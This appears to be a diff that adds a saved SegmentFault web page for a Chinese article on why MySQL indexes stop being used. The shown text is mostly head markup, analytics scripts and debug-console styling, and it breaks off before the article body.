@@ -1,0 +1,2089 @@
+<!DOCTYPE html>
+<!-- saved from url=(0073)https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article -->
+<html lang="zh-CN" data-react-helmet="lang"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>一张图搞懂MySQL的索引失效 - SegmentFault 思否</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
+    <meta httpequiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="alexaVerifyID" content="LkzCRJ7rPEUwt6fVey2vhxiw1vQ">
+    <meta name="apple-itunes-app" content="app-id=958101793, app-argument=">
+    <meta property="qc:admins" content="15317273575564615446375">
+    <meta name="msapplication-TileColor" content="#009a61">
+    <meta name="baidu_union_verify" content="bcf7fd80dca60d53d46d5b46e1b990ca">
+    <meta name="sogou_site_verification" content="MKVKCoIjwL">
+    <meta name="360-site-verification" content="737314c9bf48873a1a0a22295203d9d1">
+    <meta rel="apple-touch-icon" href="https://cdn.segmentfault.com/r-1d51384c/touch-icon.png">
+    <meta name="msapplication-square150x150logo" content="https://cdn.segmentfault.com/r-1d51384c/touch-icon.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://cdn.segmentfault.com/r-1d51384c/favicon.ico">
+    <link rel="search" type="application/opensearchdescription+xml" href="https://segmentfault.com/opensearch.xml" title="SegmentFault">
+    <link rel="alternate" type="application/atom+xml" href="https://segmentfault.com/feeds/questions" title="SegmentFault 最新问题">
+    <link rel="alternate" type="application/atom+xml" href="https://segmentfault.com/feeds/blogs" title="SegmentFault 最新文章">
+    <link rel="stylesheet" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/umi.css">
+    <script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/osd.js.下载"></script><script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(4).txt"></script><script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(5).txt" id="google_shimpl"></script><script async="" defer="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(6).txt"></script><script async="" defer="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/fl.js.下载"></script><script async="" defer="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/spc.php"></script><script async="" defer="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/spcjs.php"></script><script type="text/javascript" async="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/analytics.js.下载"></script><script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/hm.js.下载"></script><script>
+      window.routerBase = "/";
+    </script>
+    <script>
+      window.publicPath =
+        window.resourceBaseUrl || "https://cdn.segmentfault.com/r-1d51384c/";
+    </script>
+    <script>
+      //! umi version: 3.4.11
+    </script>
+    <script>
+      var _hmt = _hmt || [];
+    </script>
+    <script>
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?e23800c454aa573c0ccb16b52665ac26";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  <meta data-react-helmet="true" name="author" id="shuai"><meta data-react-helmet="true" name="keywords" content="mysql"><meta data-react-helmet="true" name="description" content="索引对于MySQL而言，是非常重要的篇章。索引知识点也巨多，要想掌握透彻，需要逐个知识点一一击破，今天来先来聊聊哪些情况下会导致索引失效。 图片总结版 全值匹配（索引最佳） {代码...} {代码...} 1、违反最左前缀法则 {代码...} 2、在索引列上做任何操作 {代码...} 3、索引范围条件右边的列 {代码...} 4、尽量使用覆..."><meta data-react-helmet="true" name="userId" value="" id="SFUserId"><meta data-react-helmet="true" name="userRank" value="" id="SFUserRank"><meta data-react-helmet="true" name="twitter:card" content="summary"><meta data-react-helmet="true" name="twitter:image" content="https://cdn.segmentfault.com/r-1d51384c/touch-icon.png"><meta data-react-helmet="true" name="twitter:site" content="@segment_fault"><meta data-react-helmet="true" name="twitter:creator" content="@segmentfault"><meta data-react-helmet="true" name="twitter:title" content="一张图搞懂MySQL的索引失效"><meta data-react-helmet="true" name="og:type" content="article"><meta data-react-helmet="true" name="og:image" content="https://cdn.segmentfault.com/r-1d51384c/touch-icon.png"><meta data-react-helmet="true" name="og:title" content="一张图搞懂MySQL的索引失效"><meta data-react-helmet="true" name="msvalidate.01" content="2C018C53297C8388F3E7052F5E9CA6AF"><meta data-react-helmet="true" name="event-object" value="{&quot;current&quot;: [&quot;article&quot;, [&quot;1190000021464570&quot;]], &quot;root&quot;: [&quot;article&quot;, &quot;1190000021464570&quot;]}" id="SFEventObject"><link rel="preload" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/layouts__index_p__Live__Add_p__Video__Add_p__Write.chunk.css"><link rel="stylesheet" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/layouts__index_p__Live__Add_p__Video__Add_p__Write.chunk.css">
+<link rel="preload" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/layouts__index.chunk.css"><link rel="stylesheet" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/layouts__index.chunk.css">
+<link rel="preload" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/vendors_p__ArticleDetail_p__Live_p__QuestionDetail_p__Video.chunk.css"><link rel="stylesheet" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/vendors_p__ArticleDetail_p__Live_p__QuestionDetail_p__Video.chunk.css">
+<link rel="preload" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/p__ArticleDetail.chunk.css"><link rel="stylesheet" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/p__ArticleDetail.chunk.css">
+<script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/js" async=""></script><style>#__vconsole {
+  --VC-BG-0: #ededed;
+  --VC-BG-1: #f7f7f7;
+  --VC-BG-2: #fff;
+  --VC-BG-3: #f7f7f7;
+  --VC-BG-4: #4c4c4c;
+  --VC-BG-5: #fff;
+  --VC-FG-0: rgba(0, 0, 0, 0.9);
+  --VC-FG-HALF: rgba(0, 0, 0, 0.9);
+  --VC-FG-1: rgba(0, 0, 0, 0.5);
+  --VC-FG-2: rgba(0, 0, 0, 0.3);
+  --VC-FG-3: rgba(0, 0, 0, 0.1);
+  --VC-RED: #fa5151;
+  --VC-ORANGE: #fa9d3b;
+  --VC-YELLOW: #ffc300;
+  --VC-GREEN: #91d300;
+  --VC-LIGHTGREEN: #95ec69;
+  --VC-BRAND: #07c160;
+  --VC-BLUE: #10aeff;
+  --VC-INDIGO: #1485ee;
+  --VC-PURPLE: #6467f0;
+  --VC-LINK: #576b95;
+  --VC-TEXTGREEN: #06ae56;
+  --VC-FG: black;
+  --VC-BG: white;
+  --VC-BG-COLOR-ACTIVE: #ececec;
+  --VC-WARN-BG: #fff3cc;
+  --VC-WARN-BORDER: #ffe799;
+  --VC-ERROR-BG: #fedcdc;
+  --VC-ERROR-BORDER: #fdb9b9;
+  --VC-DOM-TAG-NAME-COLOR: #881280;
+  --VC-DOM-ATTRIBUTE-NAME-COLOR: #994500;
+  --VC-DOM-ATTRIBUTE-VALUE-COLOR: #1a1aa6;
+  --VC-CODE-KEY-FG: #881391;
+  --VC-CODE-PRIVATE-KEY-FG: #cfa1d3;
+  --VC-CODE-FUNC-FG: #0d22aa;
+  --VC-CODE-NUMBER-FG: #1c00cf;
+  --VC-CODE-STR-FG: #c41a16;
+  --VC-CODE-NULL-FG: #808080;
+  color: var(--VC-FG-0);
+  font-size: 13px;
+  font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+  -webkit-user-select: auto;
+  /* global */
+  /* compoment */
+}
+#__vconsole .vc-max-height {
+  max-height: 19.23076923em;
+}
+#__vconsole .vc-max-height-line {
+  max-height: 3.38461538em;
+}
+#__vconsole .vc-min-height {
+  min-height: 3.07692308em;
+}
+#__vconsole dd,
+#__vconsole dl,
+#__vconsole pre {
+  margin: 0;
+}
+#__vconsole .vc-switch {
+  display: block;
+  position: fixed;
+  right: 0.76923077em;
+  bottom: 0.76923077em;
+  color: #FFF;
+  background-color: var(--VC-BRAND);
+  line-height: 1;
+  font-size: 1.07692308em;
+  padding: 0.61538462em 1.23076923em;
+  z-index: 10000;
+  border-radius: 0.30769231em;
+  box-shadow: 0 0 0.61538462em rgba(0, 0, 0, 0.4);
+}
+#__vconsole .vc-mask {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0);
+  z-index: 10001;
+  -webkit-transition: background 0.3s;
+  transition: background 0.3s;
+  -webkit-tap-highlight-color: transparent;
+  overflow-y: scroll;
+}
+#__vconsole .vc-panel {
+  display: none;
+  position: fixed;
+  min-height: 85%;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  z-index: 10002;
+  background-color: var(--VC-BG-0);
+  -webkit-transition: -webkit-transform 0.3s;
+  transition: -webkit-transform 0.3s;
+  transition: transform 0.3s;
+  transition: transform 0.3s, -webkit-transform 0.3s;
+  -webkit-transform: translate(0, 100%);
+  transform: translate(0, 100%);
+}
+#__vconsole .vc-tabbar {
+  border-bottom: 1px solid var(--VC-FG-3);
+  overflow-x: auto;
+  height: 3em;
+  width: auto;
+  white-space: nowrap;
+}
+#__vconsole .vc-tabbar .vc-tab {
+  display: inline-block;
+  line-height: 3em;
+  padding: 0 1.15384615em;
+  border-right: 1px solid var(--VC-FG-3);
+  text-decoration: none;
+  color: var(--VC-FG-0);
+  -webkit-tap-highlight-color: transparent;
+  -webkit-touch-callout: none;
+}
+#__vconsole .vc-tabbar .vc-tab:active {
+  background-color: rgba(0, 0, 0, 0.15);
+}
+#__vconsole .vc-tabbar .vc-tab.vc-actived {
+  background-color: var(--VC-BG-1);
+}
+#__vconsole .vc-content {
+  background-color: var(--VC-BG-2);
+  overflow-x: hidden;
+  overflow-y: auto;
+  position: absolute;
+  top: 3.07692308em;
+  left: 0;
+  right: 0;
+  bottom: 3.07692308em;
+  -webkit-overflow-scrolling: touch;
+  margin-bottom: constant(safe-area-inset-bottom);
+  margin-bottom: env(safe-area-inset-bottom);
+}
+#__vconsole .vc-content.vc-has-topbar {
+  top: 5.46153846em;
+}
+#__vconsole .vc-topbar {
+  background-color: var(--VC-BG-1);
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: horizontal;
+  -webkit-box-direction: normal;
+  -webkit-flex-direction: row;
+  -moz-box-orient: horizontal;
+  -moz-box-direction: normal;
+  -ms-flex-direction: row;
+  flex-direction: row;
+  -webkit-flex-wrap: wrap;
+  -ms-flex-wrap: wrap;
+  flex-wrap: wrap;
+  width: 100%;
+}
+#__vconsole .vc-topbar .vc-toptab {
+  display: none;
+  -webkit-box-flex: 1;
+  -webkit-flex: 1;
+  -moz-box-flex: 1;
+  -ms-flex: 1;
+  flex: 1;
+  line-height: 2.30769231em;
+  padding: 0 1.15384615em;
+  border-bottom: 1px solid var(--VC-FG-3);
+  text-decoration: none;
+  text-align: center;
+  color: var(--VC-FG-0);
+  -webkit-tap-highlight-color: transparent;
+  -webkit-touch-callout: none;
+}
+#__vconsole .vc-topbar .vc-toptab.vc-toggle {
+  display: block;
+}
+#__vconsole .vc-topbar .vc-toptab:active {
+  background-color: rgba(0, 0, 0, 0.15);
+}
+#__vconsole .vc-topbar .vc-toptab.vc-actived {
+  border-bottom: 1px solid var(--VC-INDIGO);
+}
+#__vconsole .vc-logbox {
+  display: none;
+  position: relative;
+  min-height: 100%;
+}
+#__vconsole .vc-logbox i {
+  font-style: normal;
+}
+#__vconsole .vc-logbox .vc-log {
+  padding-bottom: 6em;
+  -webkit-tap-highlight-color: transparent;
+}
+#__vconsole .vc-logbox .vc-log:empty:before {
+  content: "Empty";
+  color: var(--VC-FG-1);
+  position: absolute;
+  top: 45%;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  font-size: 1.15384615em;
+  text-align: center;
+}
+#__vconsole .vc-logbox .vc-item {
+  margin: 0;
+  padding: 0.46153846em 0.61538462em;
+  overflow: hidden;
+  line-height: 1.3;
+  border-bottom: 1px solid var(--VC-FG-3);
+  word-break: break-word;
+}
+#__vconsole .vc-logbox .vc-item-info {
+  color: var(--VC-PURPLE);
+}
+#__vconsole .vc-logbox .vc-item-debug {
+  color: var(--VC-YELLOW);
+}
+#__vconsole .vc-logbox .vc-item-warn {
+  color: var(--VC-ORANGE);
+  border-color: var(--VC-WARN-BORDER);
+  background-color: var(--VC-WARN-BG);
+}
+#__vconsole .vc-logbox .vc-item-error {
+  color: var(--VC-RED);
+  border-color: var(--VC-ERROR-BORDER);
+  background-color: var(--VC-ERROR-BG);
+}
+#__vconsole .vc-logbox .vc-log.vc-log-partly .vc-item {
+  display: none;
+}
+#__vconsole .vc-logbox .vc-log.vc-log-partly-log .vc-item-log,
+#__vconsole .vc-logbox .vc-log.vc-log-partly-info .vc-item-info,
+#__vconsole .vc-logbox .vc-log.vc-log-partly-warn .vc-item-warn,
+#__vconsole .vc-logbox .vc-log.vc-log-partly-error .vc-item-error {
+  display: block;
+}
+#__vconsole .vc-logbox .vc-item.hide {
+  display: none;
+}
+#__vconsole .vc-logbox .vc-item .vc-item-content {
+  margin-right: 4.61538462em;
+  display: inline-block;
+}
+#__vconsole .vc-logbox .vc-item .vc-item-repeat {
+  display: inline-block;
+  margin-right: 0.30769231em;
+  padding: 0 6.5px;
+  color: #D7E0EF;
+  background-color: #42597F;
+  border-radius: 8.66666667px;
+}
+#__vconsole .vc-logbox .vc-item.vc-item-error .vc-item-repeat {
+  color: #901818;
+  background-color: var(--VC-RED);
+}
+#__vconsole .vc-logbox .vc-item.vc-item-warn .vc-item-repeat {
+  color: #987D20;
+  background-color: #F4BD02;
+}
+#__vconsole .vc-logbox .vc-item .vc-item-code {
+  display: block;
+  white-space: pre-wrap;
+  overflow: auto;
+  position: relative;
+}
+#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input,
+#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output {
+  padding-left: 0.92307692em;
+}
+#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-input:before,
+#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before {
+  content: "›";
+  position: absolute;
+  top: -0.23076923em;
+  left: 0;
+  font-size: 1.23076923em;
+  color: #6A5ACD;
+}
+#__vconsole .vc-logbox .vc-item .vc-item-code.vc-item-code-output:before {
+  content: "‹";
+}
+#__vconsole .vc-logbox .vc-item .vc-fold {
+  display: block;
+  overflow: auto;
+  -webkit-overflow-scrolling: touch;
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer {
+  display: block;
+  font-style: italic;
+  padding-left: 0.76923077em;
+  position: relative;
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:active {
+  background-color: var(--VC-BG-COLOR-ACTIVE);
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer:before {
+  content: "";
+  position: absolute;
+  top: 0.30769231em;
+  left: 0.15384615em;
+  width: 0;
+  height: 0;
+  border: transparent solid 0.30769231em;
+  border-left-color: var(--VC-FG-1);
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer.vc-toggle:before {
+  top: 0.46153846em;
+  left: 0;
+  border-top-color: var(--VC-FG-1);
+  border-left-color: transparent;
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner {
+  display: none;
+  margin-left: 0.76923077em;
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner.vc-toggle {
+  display: block;
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-inner .vc-code-key {
+  margin-left: 0.76923077em;
+}
+#__vconsole .vc-logbox .vc-item .vc-fold .vc-fold-outer .vc-code-key {
+  margin-left: 0;
+}
+#__vconsole .vc-logbox .vc-code-key {
+  color: var(--VC-CODE-KEY-FG);
+}
+#__vconsole .vc-logbox .vc-code-private-key {
+  color: var(--VC-CODE-PRIVATE-KEY-FG);
+}
+#__vconsole .vc-logbox .vc-code-function {
+  color: var(--VC-CODE-FUNC-FG);
+  font-style: italic;
+}
+#__vconsole .vc-logbox .vc-code-number,
+#__vconsole .vc-logbox .vc-code-boolean {
+  color: var(--VC-CODE-NUMBER-FG);
+}
+#__vconsole .vc-logbox .vc-code-string {
+  color: var(--VC-CODE-STR-FG);
+}
+#__vconsole .vc-logbox .vc-code-null,
+#__vconsole .vc-logbox .vc-code-undefined {
+  color: var(--VC-CODE-NULL-FG);
+}
+#__vconsole .vc-logbox .vc-cmd {
+  position: absolute;
+  height: 3.07692308em;
+  left: 0;
+  right: 0;
+  bottom: 41px;
+  border-top: 1px solid var(--VC-FG-3);
+  display: block!important;
+}
+#__vconsole .vc-logbox .vc-cmd.vc-filter {
+  bottom: 0;
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-input-wrap {
+  display: block;
+  height: 2.15384615em;
+  margin-right: 3.07692308em;
+  padding: 0.46153846em 0.61538462em;
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-input {
+  width: 100%;
+  border: none;
+  resize: none;
+  outline: none;
+  padding: 0;
+  font-size: 0.92307692em;
+  background-color: transparent;
+  color: var(--VC-FG-0);
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-input::-webkit-input-placeholder {
+  line-height: 2.15384615em;
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn {
+  position: absolute;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  width: 3.07692308em;
+  border: none;
+  background-color: var(--VC-BG-0);
+  color: var(--VC-FG-0);
+  outline: none;
+  -webkit-touch-callout: none;
+  font-size: 1em;
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-btn:active {
+  background-color: rgba(0, 0, 0, 0.15);
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-prompted {
+  position: fixed;
+  width: 100%;
+  background-color: var(--VC-BG-3);
+  border: 1px solid var(--VC-FG-3);
+  overflow-x: scroll;
+  display: none;
+}
+#__vconsole .vc-logbox .vc-cmd .vc-cmd-prompted li {
+  list-style: none;
+  line-height: 30px;
+  padding: 0 0.46153846em;
+  border-bottom: 1px solid var(--VC-FG-3);
+}
+#__vconsole .vc-logbox .vc-group .vc-group-preview {
+  -webkit-touch-callout: none;
+}
+#__vconsole .vc-logbox .vc-group .vc-group-preview:active {
+  background-color: var(--VC-BG-COLOR-ACTIVE);
+}
+#__vconsole .vc-logbox .vc-group .vc-group-detail {
+  display: none;
+  padding: 0 0 0.76923077em 1.53846154em;
+  border-bottom: 1px solid var(--VC-FG-3);
+}
+#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-detail {
+  display: block;
+  background-color: var(--VC-BG-1);
+}
+#__vconsole .vc-logbox .vc-group.vc-actived .vc-table-row {
+  background-color: var(--VC-BG-2);
+}
+#__vconsole .vc-logbox .vc-group.vc-actived .vc-group-preview {
+  background-color: var(--VC-BG-1);
+}
+#__vconsole .vc-logbox .vc-table .vc-table-row {
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: horizontal;
+  -webkit-box-direction: normal;
+  -webkit-flex-direction: row;
+  -moz-box-orient: horizontal;
+  -moz-box-direction: normal;
+  -ms-flex-direction: row;
+  flex-direction: row;
+  -webkit-flex-wrap: wrap;
+  -ms-flex-wrap: wrap;
+  flex-wrap: wrap;
+  overflow: hidden;
+  border-bottom: 1px solid var(--VC-FG-3);
+}
+#__vconsole .vc-logbox .vc-table .vc-table-row.vc-left-border {
+  border-left: 1px solid var(--VC-FG-3);
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col {
+  -webkit-box-flex: 1;
+  -webkit-flex: 1;
+  -moz-box-flex: 1;
+  -ms-flex: 1;
+  flex: 1;
+  padding: 0.23076923em 0.30769231em;
+  border-left: 1px solid var(--VC-FG-3);
+  overflow: auto;
+  white-space: pre-wrap;
+  word-break: break-word;
+  /*white-space: nowrap;
+        text-overflow: ellipsis;*/
+  -webkit-overflow-scrolling: touch;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col:first-child {
+  border: none;
+}
+#__vconsole .vc-logbox .vc-table .vc-small .vc-table-col {
+  padding: 0 0.30769231em;
+  font-size: 0.92307692em;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col-2 {
+  -webkit-box-flex: 2;
+  -webkit-flex: 2;
+  -moz-box-flex: 2;
+  -ms-flex: 2;
+  flex: 2;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col-3 {
+  -webkit-box-flex: 3;
+  -webkit-flex: 3;
+  -moz-box-flex: 3;
+  -ms-flex: 3;
+  flex: 3;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col-4 {
+  -webkit-box-flex: 4;
+  -webkit-flex: 4;
+  -moz-box-flex: 4;
+  -ms-flex: 4;
+  flex: 4;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col-5 {
+  -webkit-box-flex: 5;
+  -webkit-flex: 5;
+  -moz-box-flex: 5;
+  -ms-flex: 5;
+  flex: 5;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col-6 {
+  -webkit-box-flex: 6;
+  -webkit-flex: 6;
+  -moz-box-flex: 6;
+  -ms-flex: 6;
+  flex: 6;
+}
+#__vconsole .vc-logbox .vc-table .vc-table-row-error {
+  border-color: var(--VC-ERROR-BORDER);
+  background-color: var(--VC-ERROR-BG);
+}
+#__vconsole .vc-logbox .vc-table .vc-table-row-error .vc-table-col {
+  color: var(--VC-RED);
+  border-color: var(--VC-ERROR-BORDER);
+}
+#__vconsole .vc-logbox .vc-table .vc-table-col-title {
+  font-weight: bold;
+}
+#__vconsole .vc-logbox.vc-actived {
+  display: block;
+}
+#__vconsole .vc-toolbar {
+  border-top: 1px solid var(--VC-FG-3);
+  line-height: 3em;
+  position: absolute;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: horizontal;
+  -webkit-box-direction: normal;
+  -webkit-flex-direction: row;
+  -moz-box-orient: horizontal;
+  -moz-box-direction: normal;
+  -ms-flex-direction: row;
+  flex-direction: row;
+}
+#__vconsole .vc-toolbar .vc-tool {
+  display: none;
+  text-decoration: none;
+  color: var(--VC-FG-0);
+  width: 50%;
+  -webkit-box-flex: 1;
+  -webkit-flex: 1;
+  -moz-box-flex: 1;
+  -ms-flex: 1;
+  flex: 1;
+  text-align: center;
+  position: relative;
+  -webkit-touch-callout: none;
+}
+#__vconsole .vc-toolbar .vc-tool.vc-toggle,
+#__vconsole .vc-toolbar .vc-tool.vc-global-tool {
+  display: block;
+}
+#__vconsole .vc-toolbar .vc-tool:active {
+  background-color: rgba(0, 0, 0, 0.15);
+}
+#__vconsole .vc-toolbar .vc-tool:after {
+  content: " ";
+  position: absolute;
+  top: 0.53846154em;
+  bottom: 0.53846154em;
+  right: 0;
+  border-left: 1px solid var(--VC-FG-3);
+}
+#__vconsole .vc-toolbar .vc-tool-last:after {
+  border: none;
+}
+@supports (bottom: constant(safe-area-inset-bottom)) or (bottom: env(safe-area-inset-bottom)) {
+  #__vconsole .vc-toolbar,
+  #__vconsole .vc-switch {
+    bottom: constant(safe-area-inset-bottom);
+    bottom: env(safe-area-inset-bottom);
+  }
+}
+#__vconsole.vc-toggle .vc-switch {
+  display: none;
+}
+#__vconsole.vc-toggle .vc-mask {
+  background: rgba(0, 0, 0, 0.6);
+  display: block;
+}
+#__vconsole.vc-toggle .vc-panel {
+  -webkit-transform: translate(0, 0);
+  transform: translate(0, 0);
+}
+@media (prefers-color-scheme: dark) {
+  #__vconsole:not([data-theme="light"]) {
+    --VC-BG-0: #191919;
+    --VC-BG-1: #1f1f1f;
+    --VC-BG-2: #232323;
+    --VC-BG-3: #2f2f2f;
+    --VC-BG-4: #606060;
+    --VC-BG-5: #2c2c2c;
+    --VC-FG-0: rgba(255, 255, 255, 0.8);
+    --VC-FG-HALF: rgba(255, 255, 255, 0.6);
+    --VC-FG-1: rgba(255, 255, 255, 0.5);
+    --VC-FG-2: rgba(255, 255, 255, 0.3);
+    --VC-FG-3: rgba(255, 255, 255, 0.05);
+    --VC-RED: #fa5151;
+    --VC-ORANGE: #c87d2f;
+    --VC-YELLOW: #cc9c00;
+    --VC-GREEN: #74a800;
+    --VC-LIGHTGREEN: #28b561;
+    --VC-BRAND: #07c160;
+    --VC-BLUE: #10aeff;
+    --VC-INDIGO: #1196ff;
+    --VC-PURPLE: #8183ff;
+    --VC-LINK: #7d90a9;
+    --VC-TEXTGREEN: #259c5c;
+    --VC-FG: white;
+    --VC-BG: black;
+    --VC-BG-COLOR-ACTIVE: #282828;
+    --VC-WARN-BG: #332700;
+    --VC-WARN-BORDER: #664e00;
+    --VC-ERROR-BG: #321010;
+    --VC-ERROR-BORDER: #642020;
+    --VC-DOM-TAG-NAME-COLOR: #5DB0D7;
+    --VC-DOM-ATTRIBUTE-NAME-COLOR: #9BBBDC;
+    --VC-DOM-ATTRIBUTE-VALUE-COLOR: #f29766;
+    --VC-CODE-KEY-FG: #e36eec;
+    --VC-CODE-PRIVATE-KEY-FG: #f4c5f7;
+    --VC-CODE-FUNC-FG: #556af2;
+    --VC-CODE-NUMBER-FG: #9980ff;
+    --VC-CODE-STR-FG: #e93f3b;
+    --VC-CODE-NULL-FG: #808080;
+  }
+}
+#__vconsole[data-theme="dark"] {
+  --VC-BG-0: #191919;
+  --VC-BG-1: #1f1f1f;
+  --VC-BG-2: #232323;
+  --VC-BG-3: #2f2f2f;
+  --VC-BG-4: #606060;
+  --VC-BG-5: #2c2c2c;
+  --VC-FG-0: rgba(255, 255, 255, 0.8);
+  --VC-FG-HALF: rgba(255, 255, 255, 0.6);
+  --VC-FG-1: rgba(255, 255, 255, 0.5);
+  --VC-FG-2: rgba(255, 255, 255, 0.3);
+  --VC-FG-3: rgba(255, 255, 255, 0.05);
+  --VC-RED: #fa5151;
+  --VC-ORANGE: #c87d2f;
+  --VC-YELLOW: #cc9c00;
+  --VC-GREEN: #74a800;
+  --VC-LIGHTGREEN: #28b561;
+  --VC-BRAND: #07c160;
+  --VC-BLUE: #10aeff;
+  --VC-INDIGO: #1196ff;
+  --VC-PURPLE: #8183ff;
+  --VC-LINK: #7d90a9;
+  --VC-TEXTGREEN: #259c5c;
+  --VC-FG: white;
+  --VC-BG: black;
+  --VC-BG-COLOR-ACTIVE: #282828;
+  --VC-WARN-BG: #332700;
+  --VC-WARN-BORDER: #664e00;
+  --VC-ERROR-BG: #321010;
+  --VC-ERROR-BORDER: #642020;
+  --VC-DOM-TAG-NAME-COLOR: #5DB0D7;
+  --VC-DOM-ATTRIBUTE-NAME-COLOR: #9BBBDC;
+  --VC-DOM-ATTRIBUTE-VALUE-COLOR: #f29766;
+  --VC-CODE-KEY-FG: #e36eec;
+  --VC-CODE-PRIVATE-KEY-FG: #f4c5f7;
+  --VC-CODE-FUNC-FG: #556af2;
+  --VC-CODE-NUMBER-FG: #9980ff;
+  --VC-CODE-STR-FG: #e93f3b;
+  --VC-CODE-NULL-FG: #808080;
+}
+</style><style>/* color */
+.vcelm-node {
+  color: var(--VC-DOM-TAG-NAME-COLOR);
+}
+.vcelm-k {
+  color: var(--VC-DOM-ATTRIBUTE-NAME-COLOR);
+}
+.vcelm-v {
+  color: var(--VC-DOM-ATTRIBUTE-VALUE-COLOR);
+}
+/* layout */
+.vcelm-l {
+  padding-left: 8px;
+  position: relative;
+  word-wrap: break-word;
+  line-height: 1;
+}
+/*.vcelm-l.vcelm-noc {
+  padding-left: 0;
+}*/
+.vcelm-l.vc-toggle > .vcelm-node {
+  display: block;
+}
+.vcelm-l .vcelm-node:active {
+  background-color: var(--VC-BG-COLOR-ACTIVE);
+}
+.vcelm-l.vcelm-noc .vcelm-node:active {
+  background-color: transparent;
+}
+.vcelm-t {
+  white-space: pre-wrap;
+  word-wrap: break-word;
+}
+/* level */
+.vcelm-l .vcelm-l {
+  display: none;
+}
+.vcelm-l.vc-toggle > .vcelm-l {
+  margin-left: 4px;
+  display: block;
+}
+/* arrow */
+.vcelm-l:before {
+  content: "";
+  display: block;
+  position: absolute;
+  top: 6px;
+  left: 3px;
+  width: 0;
+  height: 0;
+  border: transparent solid 3px;
+  border-left-color: var(--VC-FG-1);
+}
+.vcelm-l.vc-toggle:before {
+  display: block;
+  top: 6px;
+  left: 0;
+  border-top-color: var(--VC-FG-1);
+  border-left-color: transparent;
+}
+.vcelm-l.vcelm-noc:before {
+  display: none;
+}
+</style><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/vendors_layouts__index_p__Area__GDS-2020_p__Area__Gromore_p__Area__HarmonyOSForerunner_p__ArticleDet_02c34f5a.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/vendors_layouts__index_p__ArticleDetail_p__Blogs_p__Live_p__Live__Add_p__PersonalSetting_p__Question_e888a1ad.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/vendors_layouts__index.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/layouts__index_p__Live__Add_p__Video__Add_p__Write.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/layouts__index.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 